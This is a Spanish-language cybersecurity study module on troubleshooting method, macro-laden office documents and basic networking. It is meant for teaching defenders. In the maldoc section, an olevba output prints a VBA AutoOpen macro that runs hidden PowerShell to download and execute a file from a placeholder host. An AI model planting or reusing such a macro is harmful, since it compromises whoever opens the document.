# Fundamentos de IT

## Conceptos previos

- Sistema operativo (OS): el programa base que administra el hardware y deja correr a los demás programas (Windows, Linux, macOS, Android).
- Hardware: las piezas físicas del equipo (CPU, RAM, disco, tarjeta de red).
- Software: los programas; incluye el OS, las aplicaciones y los drivers.
- Driver: pequeño programa que le enseña al OS a hablar con un dispositivo concreto.
- Proceso: un programa en ejecución, con su memoria y su identificador (PID).
- Log: archivo o registro donde un programa anota lo que hizo y los errores que tuvo.
- Malware: software escrito para dañar, robar o tomar control de un equipo.
- Phishing: engaño por correo, mensaje o web para que la víctima entregue datos o abra algo malicioso.
- Nube (cloud): servidores de un proveedor a los que se accede por Internet para guardar datos o correr programas.
- Paquete: trozo de datos con una cabecera que dice de dónde viene y a dónde va; es la unidad que viaja por una red.
- Protocolo: conjunto de reglas que dos equipos acuerdan para entenderse (HTTP, DNS, TCP).

## Fundamental IT Skills

### OS-Independent Troubleshooting

El **OS-Independent Troubleshooting** es un método de diagnóstico que resuelve fallos técnicos con los mismos pasos lógicos sin importar el sistema operativo, el fabricante o la aplicación involucrada. Lo que cambia entre Windows y Linux son las herramientas (Visor de eventos frente a `journalctl`, Administrador de tareas frente a `top`); el razonamiento es el mismo.

Por qué existe: un analista de seguridad recibe a diario cosas como "la VPN no conecta", "el equipo está lento", "el antivirus no actualiza". Si diagnostica por intuición, cambia tres cosas a la vez, no sabe cuál arregló el problema y a veces borra la evidencia de un incidente real. Un método fijo evita las dos cosas: llega a la causa y deja rastro de lo que se hizo.

Analogía: es lo que hace un médico. Pregunta síntomas, sospecha una causa, pide un examen que confirme o descarte, receta, y cita al paciente para ver si mejoró. No receta antibiótico, analgésico y cirugía a la vez "por si acaso".

El método que usa CompTIA (y casi toda la industria) tiene seis pasos, en este orden:

1. Identificar el problema: preguntar al usuario, revisar logs, ver qué cambió recientemente (una actualización, un cable movido, un usuario nuevo). Duplicar el problema si se puede. Hacer respaldo antes de tocar nada.
2. Establecer una teoría de causa probable: empezar por lo obvio y barato de verificar ("¿está enchufado?") y cuestionar lo evidente.
3. Probar la teoría: verificar sin arreglar todavía. Si se confirma, decidir el arreglo; si no, volver al paso 2 con otra teoría o escalar a alguien con más acceso.
4. Establecer un plan de acción e implementarlo: considerar el impacto (¿hay que reiniciar un servidor en horario laboral?) y pedir permiso si afecta a otros.
5. Verificar que todo el sistema funciona y aplicar medidas preventivas para que no se repita.
6. Documentar hallazgos, acciones y resultado.

```
  Identificar --> Teoría --> Probar --+--> Plan e implementar --> Verificar --> Documentar
                    ^                 |
                    |   no confirmada |
                    +-----------------+
                    (o escalar)
```

Hay tres estrategias para recorrer un sistema por capas (útiles sobre todo en redes, donde las capas son explícitas):

- De abajo hacia arriba (bottom-up): empezar por lo físico (cable, luz del puerto) y subir hasta la aplicación. Conviene cuando hay sospecha de hardware o nadie sabe nada.
- De arriba hacia abajo (top-down): empezar por la aplicación y bajar. Conviene cuando el síntoma es de un solo programa.
- Divide y vencerás: probar en una capa intermedia; si esa capa funciona, todo lo de abajo también, y se descarta media pila de un golpe. Es la más rápida cuando hay experiencia.

Herramientas equivalentes entre sistemas (el método no cambia, cambia el nombre):

```
Ver procesos y consumo   → Windows: Task Manager / tasklist   Linux: top, ps
Ver logs del sistema     → Windows: Event Viewer              Linux: journalctl, /var/log
Configuración de red     → Windows: ipconfig /all             Linux: ip addr
Probar conectividad      → Windows y Linux: ping, tracert / traceroute
Resolver nombres         → Windows y Linux: nslookup; Linux también dig
Servicios                → Windows: services.msc / sc query   Linux: systemctl status
```

Ejemplo: un usuario dice "no tengo Internet".

```
$ ping -c 2 192.168.1.1          # ¿llego al router? (capa de red local)
2 packets transmitted, 2 received, 0% packet loss
$ ping -c 2 8.8.8.8              # ¿llego a Internet por IP?
2 packets transmitted, 2 received, 0% packet loss
$ ping -c 2 google.com           # ¿funciona la resolución de nombres?
ping: google.com: Temporary failure in name resolution
```

Con tres comandos se descartó el cable, el router y el proveedor: el problema es DNS (el servicio que traduce nombres a direcciones IP). Eso es divide y vencerás: la segunda prueba demostró que todo lo de abajo funcionaba.

Contraejemplo: el técnico reinicia el router, reinstala el driver y cambia el DNS a la vez. El problema se va, pero nadie sabe cuál fue la causa, y la semana siguiente vuelve.

> [!WARNING]
> En seguridad, el paso 1 incluye no destruir evidencia. Reiniciar un equipo "lento" puede borrar de la memoria al malware que causaba la lentitud; si hay sospecha de incidente, se aísla y se escala antes de arreglar.

El enlace con respuesta a incidentes está en [`16-respuesta-a-incidentes-y-forense`](../16-respuesta-a-incidentes-y-forense/).

```
Identificar → reunir síntomas, logs y cambios recientes; respaldar.
Teoría → hipótesis de causa, de lo simple a lo complejo.
Probar → confirmar o descartar sin arreglar todavía.
Plan e implementar → aplicar el arreglo considerando el impacto.
Verificar → comprobar que todo funciona y prevenir repetición.
Documentar → dejar registro de causa, acción y resultado.
Bottom-up → de lo físico a la aplicación.
Top-down → de la aplicación a lo físico.
Divide y vencerás → probar en medio y descartar mitades.
```

### Un cambio a la vez: el método vale más que la herramienta

> [!IMPORTANT]
> El troubleshooting funciona porque cada prueba cambia una sola variable; así cada resultado descarta o confirma una causa concreta, en cualquier sistema operativo.

La regla de una variable por prueba es la idea que hace al método independiente del OS: las herramientas son intercambiables, pero la lógica de "aislar, probar, concluir" es la misma en un PC, un servidor Linux, un router o un celular.

```
                     Windows            Linux              Router
Ver qué pasó         Event Viewer       journalctl         show logging
Probar una hipótesis ping / nslookup    ping / dig         ping / show ip route
Regla de la prueba   1 cambio, 1 obs.   1 cambio, 1 obs.   1 cambio, 1 obs.
```

La última fila es idéntica en las tres columnas: ahí está la idea entera.

Ejemplo: si se cambia el DNS y la navegación vuelve, el DNS era la causa. Si se cambiaron DNS y driver a la vez, el resultado no enseña nada. El límite de la regla: en una emergencia de producción a veces se aplica primero la solución conocida que restaura el servicio y se busca la causa después, pero eso se documenta como tal.

```
Una variable por prueba → cada resultado confirma o descarta una causa.
Varias a la vez → el problema se va pero la causa queda desconocida.
```

### Understand Basics of Popular Suites

Una **suite de productividad** es un paquete de aplicaciones de oficina integradas (procesador de texto, hoja de cálculo, presentaciones, correo, calendario y almacenamiento) que comparten formato de archivo, cuenta de usuario y, hoy casi siempre, sincronización con la nube. Las más difundidas son la de Microsoft, la de Google y la de Apple, más alternativas libres como LibreOffice.

Por qué le importan a seguridad: son el software que todo empleado usa todos los días, abren archivos que llegan de fuera (adjuntos de correo) y guardan la información más valiosa de la empresa (contratos, planillas, presentaciones). Eso las vuelve a la vez la puerta de entrada favorita del atacante y el lugar de donde más datos se fugan.

Analogía: la suite es la sala de reuniones de una empresa. Todos entran, todos dejan papeles, y cualquiera que logre colar un sobre en la mesa tiene a decenas de personas que lo van a abrir sin desconfiar.

Hay tres frentes que conviene entender sin entrar en un producto concreto:

1. Macros. Una **macro** es un pequeño programa guardado dentro de un documento para automatizar tareas (en la suite de Microsoft se escriben en VBA, Visual Basic for Applications; en otras, en JavaScript o Basic). El problema es que ese programa puede hacer lo mismo que cualquier programa: descargar un archivo, ejecutar comandos, leer otros documentos. Por eso las suites modernas desactivan las macros de archivos que vienen de Internet y muestran un aviso; el atacante, entonces, escribe en el documento "habilite el contenido para ver la factura".
2. Documentos maliciosos (maldocs). Un **maldoc** es un archivo de oficina armado para comprometer el equipo de quien lo abre. Las técnicas típicas son: macros que descargan malware, vínculos a plantillas remotas que se cargan al abrir, objetos incrustados (OLE, Object Linking and Embedding: un archivo metido dentro de otro) y explotación de fallos del programa lector. MITRE ATT&CK los clasifica como Spearphishing Attachment (T1566.001) para la entrega y Malicious File (T1204.002) para el momento en que la víctima lo abre.
3. Sincronización en la nube. Las suites actuales guardan cada archivo en el almacenamiento del proveedor y lo replican en todos los dispositivos de la cuenta. Eso trae tres riesgos: quien roba la contraseña de la cuenta ve todos los documentos sin tocar ningún equipo; un archivo compartido "con cualquiera que tenga el enlace" queda público aunque nadie lo publique; y lo que se daña en un dispositivo (por ejemplo, archivos cifrados por ransomware) se sincroniza al resto. Lo que la protege: autenticación multifactor (MFA), revisión periódica de enlaces compartidos y el historial de versiones, que permite volver a un archivo anterior al daño.

Cadena típica de un maldoc:

```
Correo "Factura pendiente"
        |
        v
Adjunto factura.docm (macro dentro)
        |
        v
Usuario abre --> aviso "Contenido deshabilitado" --> usuario pulsa "Habilitar"
        |
        v
La macro ejecuta un comando --> descarga malware --> el atacante entra
```

Ejemplo defensivo: un analista recibe un adjunto sospechoso y lo examina en una máquina de laboratorio con `olevba` (de la colección oletools), que extrae las macros sin ejecutarlas:

```
$ olevba factura.docm
VBA MACRO NewMacros.bas
Sub AutoOpen()
    Shell "powershell -w hidden -c iwr http://ejemplo.invalid/a.exe -o a.exe; .\a.exe"
End Sub
+----------+------------+-------------------------------------------+
|Type      |Keyword     |Description                                |
+----------+------------+-------------------------------------------+
|AutoExec  |AutoOpen    |Runs when the Word document is opened      |
|Suspicious|Shell       |May run an executable file or a system     |
|          |            |command                                    |
|Suspicious|powershell  |May run PowerShell commands                |
+----------+------------+-------------------------------------------+
```

`AutoOpen` significa que la macro corre sola al abrir; `Shell` y `powershell` significan que ejecuta comandos del sistema. Un documento de texto no tiene ninguna razón legítima para eso.

Pistas numéricas y de formato que sirven de criterio:

- Las extensiones terminadas en `m` (`.docm`, `.xlsm`, `.pptm`) admiten macros; las terminadas en `x` (`.docx`, `.xlsx`) no.
- Un archivo descargado de Internet lleva la marca Mark of the Web (MOTW); desde 2022 la suite de Microsoft bloquea por defecto las macros de esos archivos.
- Un enlace compartido "público" o "cualquiera con el enlace" no exige iniciar sesión: quien tenga la URL lee el archivo.

> [!TIP]
> Criterio práctico: un documento que pide habilitar macros o contenido para "verse bien" se trata como sospechoso hasta demostrar lo contrario.

```
Suite de productividad → conjunto integrado de apps de oficina con cuenta y nube.
Macro → programa dentro de un documento; puede ejecutar comandos.
Maldoc → documento armado para comprometer a quien lo abre.
Sincronización → réplica de archivos en todos los dispositivos de la cuenta.
MOTW → marca de "vino de Internet"; activa el bloqueo de macros.
.docm/.xlsm → admiten macros; .docx/.xlsx → no.
```

### Un documento con macros es un programa

> [!IMPORTANT]
> Un archivo de oficina con macros no es solo datos: es código que se ejecuta con los permisos del usuario que lo abre.

Esta idea conecta la suite de oficina con todo el resto de la seguridad: el mismo control que se aplica a un ejecutable (de dónde viene, quién lo firmó, si se permite correr) tiene que aplicarse a un documento con macros.

```
                         .docx sin macros     .docm con macros     programa .exe
Contiene datos           sí                   sí                   sí
Puede ejecutar comandos  no                   sí                   sí
Se trata como            documento            programa             programa
```

La segunda fila es la que cambia: en cuanto un archivo puede ejecutar comandos, deja de ser "solo un documento".

Ejemplo: en una empresa de 100 personas, un correo con adjunto `.docm` llega a todos; basta con que 1 persona pulse "Habilitar" para que el atacante tenga un equipo dentro de la red. Límite: un documento sin macros también puede ser peligroso si explota un fallo del programa lector o carga una plantilla remota, así que la ausencia de macros reduce el riesgo pero no lo elimina.

```
Documento sin macros → datos; riesgo menor pero no nulo.
Documento con macros → programa; mismo control que un ejecutable.
```

### Basics of Computer Networking

Una **red de computadoras** es un conjunto de dispositivos conectados que intercambian datos siguiendo protocolos comunes. Internet es la red de redes: millones de redes independientes unidas por routers que hablan los mismos protocolos.

Por qué importa en seguridad: casi todo ataque viaja por la red (un correo, un escaneo, una conexión de control desde el malware) y casi toda defensa la vigila (firewall, IDS, registro de tráfico). Sin el mapa básico de cómo se mueven los datos no se puede leer una alerta.

Analogía: una red funciona como el correo postal. La carta (los datos) va dentro de un sobre con remitente y destinatario (la cabecera); la oficina local (el switch) reparte dentro del barrio, y las centrales de distribución (los routers) mueven el sobre entre ciudades mirando solo la dirección, nunca el contenido.

Piezas mínimas del panorama (el detalle de cada una vive en temas posteriores):

- Tipos por alcance: LAN (red local, una casa u oficina), WAN (red de área amplia, que une sedes distantes; Internet es la mayor), y otras como WLAN (LAN inalámbrica) o MAN (de una ciudad).
- Dispositivos: el switch conecta equipos dentro de una LAN usando direcciones MAC (identificador físico de la tarjeta de red); el router une redes distintas usando direcciones IP; el access point da acceso Wi-Fi; el firewall decide qué tráfico pasa.
- Direcciones: la dirección IP identifica un equipo en la red (IPv4 tiene 32 bits, unos 4.300 millones de direcciones; IPv6 tiene 128 bits). El puerto identifica el servicio dentro del equipo (HTTPS usa el 443, SSH el 22, DNS el 53).
- Modelos de capas: OSI (7 capas) y TCP/IP (4 capas) dividen la comunicación en niveles, cada uno con su trabajo. Sirven para ubicar un problema o un ataque ("es de capa 2", "es de capa 7").
- Servicios de apoyo: DHCP reparte direcciones IP automáticamente; DNS traduce nombres como `ejemplo.com` a direcciones IP.

Recorrido de una petición web, de punta a punta:

```
[Laptop 192.168.1.10]
   | 1. DHCP le dio IP, gateway 192.168.1.1 y DNS
   | 2. Pregunta al DNS: ¿IP de ejemplo.com?  -> 93.184.215.14
   v
[Switch] -- reparte dentro de la LAN por MAC
   |
   v
[Router 192.168.1.1] -- traduce a la IP pública (NAT) y envía a Internet
   |
   v
[Routers de Internet] -- cada uno mira la IP destino y pasa el paquete
   |
   v
[Servidor 93.184.215.14 : 443] -- responde con la página por HTTPS
```

Ejemplo con un comando real: `traceroute` muestra cada router por el que pasa el paquete, salto a salto.

```
$ traceroute -n 1.1.1.1
 1  192.168.1.1    1.2 ms   1.0 ms   1.1 ms    # el router de casa
 2  10.20.0.1      8.4 ms   8.1 ms   8.9 ms    # primer router del proveedor
 3  200.10.5.33   12.7 ms  12.3 ms  12.9 ms
 4  1.1.1.1       14.0 ms  13.8 ms  14.2 ms    # destino
```

Cuatro saltos y unos 14 ms: el primer salto siempre es la puerta de enlace (gateway) de la propia red.

> [!NOTE]
> Esta sección es solo el mapa general. Capas, medios, topologías y dispositivos se desarrollan en [`03-fundamentos-de-redes`](../03-fundamentos-de-redes/); direcciones IP, máscaras y subredes en [`04-direccionamiento-ip`](../04-direccionamiento-ip/); puertos y protocolos en [`05-protocolos-y-puertos`](../05-protocolos-y-puertos/).

```
LAN → red local de un edificio.
WAN → red que une lugares distantes; Internet es la mayor.
Switch → reparte dentro de la LAN por dirección MAC.
Router → une redes distintas por dirección IP.
IP → dirección del equipo; puerto → dirección del servicio dentro del equipo.
DNS → nombre a IP.
DHCP → reparte IP automáticamente.
OSI (7) / TCP/IP (4) → modelos de capas para ubicar funciones y fallos.
```

## Recursos para aprender y practicar

### Videos

- [How to Troubleshoot - CompTIA A+ 220-1101 - 5.1](https://www.youtube.com/watch?v=_MhEZbyHbyk) — Professor Messer; los seis pasos de la metodología de troubleshooting. Nodo OS-Independent Troubleshooting.
- [Troubleshooting Networks - CompTIA A+ 220-1201 - 5.5](https://www.youtube.com/watch?v=VBDS_kOHhVk) — Professor Messer; síntomas de red frecuentes y cómo aislarlos. Une Troubleshooting y Basics of Computer Networking.
- [Reversing Malicious Office Document (Macro) Emotet(?)](https://www.youtube.com/watch?v=cjlctph9cZE) — IppSec; extracción de macros con olevba y análisis paso a paso de un maldoc. Nodo Understand Basics of Popular Suites.
- [Easily Extracting Malware from an Office Macro](https://www.youtube.com/watch?v=A49S5xCnWsI) — Marcus Hutchins; cómo una macro descarga su carga útil. Nodo Understand Basics of Popular Suites.
- [Analyzing Malicious Office Documents (Didier Stevens Workshop)](https://www.youtube.com/watch?v=opdVFQEBCNU) — 44CON; taller largo con oledump y YARA, para profundizar en maldocs. Nodo Understand Basics of Popular Suites.
- [Computer Networks: Crash Course Computer Science #28](https://www.youtube.com/watch?v=3QhU9jd03a0) — CrashCourse; panorama histórico y conceptual de las redes. Nodo Basics of Computer Networking.
- [Hub, Switch, & Router Explained - What's the difference?](https://www.youtube.com/watch?v=1z0ULvg_pW8) — PowerCert Animated Videos; los dispositivos básicos animados. Nodo Basics of Computer Networking.
- [Network Types: LAN, WAN, PAN, CAN, MAN, SAN, WLAN](https://www.youtube.com/watch?v=4_zSIXb7tLQ) — PowerCert Animated Videos; tipos de red por alcance. Nodo Basics of Computer Networking.

### Lectura y documentación

- [The Troubleshooting Process](https://www.professormesser.com/free-a-plus-training/a-plus-videos/the-troubleshooting-process/) — Professor Messer; página de la metodología con notas. Troubleshooting.
- [Macros from the internet are blocked by default in Office](https://learn.microsoft.com/en-us/microsoft-365-apps/security/internet-macros-blocked) — Microsoft Learn; cómo funciona el bloqueo por Mark of the Web. Suites.
- [MITRE ATT&CK T1566.001 Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/) — entrega de maldocs por correo. Suites.
- [MITRE ATT&CK T1204.002 Malicious File](https://attack.mitre.org/techniques/T1204/002/) — ejecución cuando el usuario abre el archivo. Suites.
- [MITRE ATT&CK T1530 Data from Cloud Storage](https://attack.mitre.org/techniques/T1530/) — robo de datos desde almacenamiento en la nube mal configurado. Suites (sincronización).
- [MITRE ATT&CK T1567.002 Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002/) — fuga de datos usando servicios de nube legítimos. Suites (sincronización).
- [oletools](https://github.com/decalage2/oletools) — repositorio de olevba, oleid y mraptor para analizar documentos de oficina. Suites.
- [How does the Internet work?](https://www.cloudflare.com/learning/network-layer/how-does-the-internet-work/) — Cloudflare Learning Center; paquetes, protocolos y routers en lenguaje simple. Networking.
- [What is a packet?](https://www.cloudflare.com/learning/network-layer/what-is-a-packet/) — Cloudflare Learning Center; cabecera y carga de un paquete. Networking.
- [RFC 1122: Requirements for Internet Hosts](https://www.rfc-editor.org/rfc/rfc1122) — la referencia formal de las capas de la pila TCP/IP. Networking (lectura avanzada).

### Práctica

- [TryHackMe: What is Networking?](https://tryhackme.com/room/whatisnetworking) — sala gratuita introductoria. Basics of Computer Networking.
- [TryHackMe: Intro to LAN](https://tryhackme.com/room/introtolan) — topologías, subredes y DHCP en una LAN. Basics of Computer Networking.
- [TryHackMe: MAL: Malware Introductory](https://tryhackme.com/room/malmalintroductory) — gratis; tipos de malware y análisis estático básico, incluido el de documentos. Understand Basics of Popular Suites.
- [CyberDefenders: MalDoc101](https://cyberdefenders.org/blueteam-ctf-challenges/maldoc101/) — reto blue team de análisis de un documento con macros. Understand Basics of Popular Suites.
- [Ejercicio 1: Diagnostica un fallo de DNS con el método por capas](ejercicios.md#ejercicio-1-diagnostica-un-fallo-de-dns-con-el-método-por-capas) — rompe el DNS de una VM a propósito y aísla la causa con tres pings encadenados.
- [Ejercicio 2: Extrae la macro de un documento con olevba](ejercicios.md#ejercicio-2-extrae-la-macro-de-un-documento-con-olevba) — crea un documento con macro inofensiva y confirma con olevba que se ejecuta sola al abrir.
- [Ejercicio 3: Rastrea la ruta a tres destinos con traceroute](ejercicios.md#ejercicio-3-rastrea-la-ruta-a-tres-destinos-con-traceroute) — identifica tu gateway, el primer router del proveedor y los saltos hasta cada destino.

## Cuadro resumen

Todo lo visto, en una línea por término.

Fundamental IT Skills

```
OS-Independent Troubleshooting → método de diagnóstico igual en cualquier OS.
Identificar → reunir síntomas, logs y cambios recientes; respaldar.
Teoría → hipótesis de causa, de lo simple a lo complejo.
Probar → confirmar o descartar sin arreglar todavía.
Plan e implementar → aplicar el arreglo considerando el impacto.
Verificar → comprobar que todo funciona y prevenir repetición.
Documentar → dejar registro de causa, acción y resultado.
Bottom-up → de lo físico a la aplicación.
Top-down → de la aplicación a lo físico.
Divide y vencerás → probar en medio y descartar mitades.
Una variable por prueba → cada resultado confirma o descarta una causa.
Varias a la vez → el problema se va pero la causa queda desconocida.
Evidencia → ante sospecha de incidente, aislar y escalar antes de reiniciar.
```

```
Suite de productividad → conjunto integrado de apps de oficina con cuenta y nube.
Macro → programa dentro de un documento; puede ejecutar comandos.
Maldoc → documento armado para comprometer a quien lo abre.
Sincronización → réplica de archivos en todos los dispositivos de la cuenta.
MOTW → marca de "vino de Internet"; activa el bloqueo de macros.
.docm/.xlsm → admiten macros; .docx/.xlsx → no.
Documento sin macros → datos; riesgo menor pero no nulo.
Documento con macros → programa; mismo control que un ejecutable.
```

```
Red de computadoras → dispositivos conectados que intercambian datos por protocolos.
LAN → red local de un edificio.
WAN → red que une lugares distantes; Internet es la mayor.
Switch → reparte dentro de la LAN por dirección MAC.
Router → une redes distintas por dirección IP.
IP → dirección del equipo; puerto → dirección del servicio dentro del equipo.
DNS → nombre a IP.
DHCP → reparte IP automáticamente.
OSI (7) / TCP/IP (4) → modelos de capas para ubicar funciones y fallos.
```
